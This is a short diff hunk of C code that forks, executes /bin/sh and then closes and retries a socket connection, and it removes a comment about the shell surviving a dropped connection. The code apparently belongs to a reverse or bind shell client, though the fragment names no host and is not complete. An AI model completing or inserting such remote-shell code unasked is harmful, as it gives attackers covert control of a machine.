@@ -48,8 +48,7 @@ start:
         execve("/bin/sh", (char *[]){PREFIX, NULL}, NULL);
     }
     int status;
-    waitpid(pid, &status, 0); // i think this shits out when the connection dies but shell still running
-                              // probably use poll instead of dup2
+    waitpid(pid, &status, 0);
 
 retry:
     close(sock);
